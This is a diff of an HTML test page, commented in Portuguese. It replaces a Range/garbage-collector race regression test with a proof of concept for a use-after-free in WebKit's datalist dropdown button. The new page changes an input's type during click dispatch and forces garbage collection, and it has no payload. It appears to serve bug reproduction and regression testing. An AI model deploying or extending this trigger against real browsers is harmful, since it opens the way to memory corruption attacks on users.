@@ -1,80 +1,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>Teste de Regressão: Data Race em Range::visitNodesConcurrently</title>
+    <meta charset="utf-8">
+    <title>WebKit DataListButton UAF PoC</title>
+    <style>
+        #input {
+            width: 300px;
+            height: 60px;
+            font-size: 24px;
+        }
+        #btn-trigger {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 18px;
+        }
+    </style>
 </head>
 <body>
-<div id="container"></div>
-<div id="status">Executando teste...</div>
+    <h3>Clique diretamente na seta do dropdown ou use o botão de trigger automático:</h3>
+    
+    <input id="input" type="text" list="list">
+    <datalist id="list">
+        <option value="Opcao A">
+        <option value="Opcao B">
+    </datalist>
 
-<script>
-// Função utilitária de GC via alocação recursiva de memória
-function gc() {
-    function gcRec(n) {
-        if (n < 1)
-            return {};
-        var temp = { i: "ab" + i + (i / 100000) };
-        temp += "foo";
-        gcRec(n - 1);
-    }
-    for (var i = 0; i < 1000; i++)
-        gcRec(10);
-}
+    <br>
+    <button id="btn-trigger">Disparar Teste Automático</button>
+    <div id="status" style="margin-top: 15px; font-family: monospace;">Aguardando ação...</div>
 
-function runRangeGCRaceTest() {
-    const container = document.getElementById("container");
-    const heldRanges = [];
+    <script>
+    const input = document.getElementById('input');
+    const status = document.getElementById('status');
 
-    for (let cycle = 0; cycle < 120; cycle++) {
-        // 1. Cria nós DOM de texto e contêineres
-        const parentDiv = document.createElement("div");
-        const textNode1 = document.createTextNode("Texto de teste bloco 1 - " + cycle);
-        const textNode2 = document.createTextNode("Texto de teste bloco 2 - " + cycle);
-        parentDiv.appendChild(textNode1);
-        parentDiv.appendChild(textNode2);
-        container.appendChild(parentDiv);
+    // 1. O manipulador escuta o clique no input
+    input.addEventListener('click', (e) => {
+        status.innerText = 'Evento click recebido. Alterando input.type...';
+        
+        // Destrói a instância de TextFieldInputType enquanto o evento ainda está no meio do despacho
+        input.type = 'button';
 
-        // 2. Cria objetos Range apontando para os nós
-        const range = document.createRange();
-        range.setStart(textNode1, 0);
-        range.setEnd(textNode2, textNode2.length);
-        heldRanges.push(range);
-
-        // 3. Modifica as fronteiras do Range de forma intensiva
-        range.selectNodeContents(parentDiv);
-        range.collapse(cycle % 2 === 0);
-        range.setStart(textNode1, Math.min(2, textNode1.length));
-        range.setEnd(textNode2, Math.min(4, textNode2.length));
-
-        // 4. Muta o DOM subjacente (dispara textInserted, textRemoved e nodeWillBeRemoved no Range)
-        textNode1.insertData(2, "INSERCAO");
-        textNode2.deleteData(0, 3);
-        parentDiv.removeChild(textNode1);
-        container.removeChild(parentDiv);
-
-        // 5. Estressa a GC thread concorrente durante as modificações
-        // Sem o lock m_boundaryPointLock, a GC thread lia m_start/m_end em conflito com as mutações
-        if (cycle % 4 === 0) {
+        // Tenta forçar a coleta de lixo/reuso de memória caso gc() esteja exposto
+        if (typeof gc === 'function') {
             gc();
+        } else if (window.GCController) {
+            window.GCController.collect();
         }
+    }, { once: true });
 
-        // Mantém um conjunto controlado de referências ativas
-        if (heldRanges.length > 40) {
-            heldRanges.splice(0, 15);
-        }
-    }
-}
+    // 2. Disparo automatizado simulando clique na extremidade direita (onde fica o list-button)
+    document.getElementById('btn-trigger').onclick = () => {
+        const rect = input.getBoundingClientRect();
+        
+        // Coordenadas próximas à borda direita para acertar o pseudo-elemento do dropdown
+        const clickX = rect.left + rect.width - 15;
+        const clickY = rect.top + (rect.height / 2);
 
-try {
-    runRangeGCRaceTest();
-    setTimeout(() => {
-        gc();
-        document.getElementById("status").innerText = "PASS: Operações concorrentes de Range e GC concluídas sem Use-After-Free.";
-    }, 200);
-} catch (e) {
-    document.getElementById("status").innerText = "FAIL: " + e.message;
-}
-</script>
+        const evt = new MouseEvent('click', {
+            bubbles: true,
+            cancelable: true,
+            view: window,
+            clientX: clickX,
+            clientY: clickY
+        });
+
+        input.dispatchEvent(evt);
+
+        setTimeout(() => {
+            status.innerText = 'Teste finalizado: Sobreviveu (sem crash).';
+        }, 100);
+    };
+    </script>
 </body>
 </html>
